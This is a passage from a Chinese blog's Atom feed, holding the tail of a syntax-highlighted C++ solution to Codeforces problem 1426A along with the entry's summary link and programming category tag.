;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((n - <span class="number">2</span>) % x)</span><br><span class="line">cout &lt;&lt; ans + <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ll t;</span><br><span class="line">cin &gt;&gt; t;</span><br><span class="line"><span class="keyword">while</span> (t --) &#123;</span><br><span class="line"><span class="built_in">solve</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;题目来源：&lt;a href=&quot;https://codeforces.com/contest/1426/problem/A&quot;&gt;https://codeforces.com/contest/1426/problem/A&lt;/a&gt;&lt;/p&gt;
&lt;/blockqu</summary>
      
    
    
    
    <category term="编程/程序设计" scheme="http://jiangnanpsalter.com/categories/%E7%BC%96%E7%A8%8B-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
  </entry>
  
</feed>
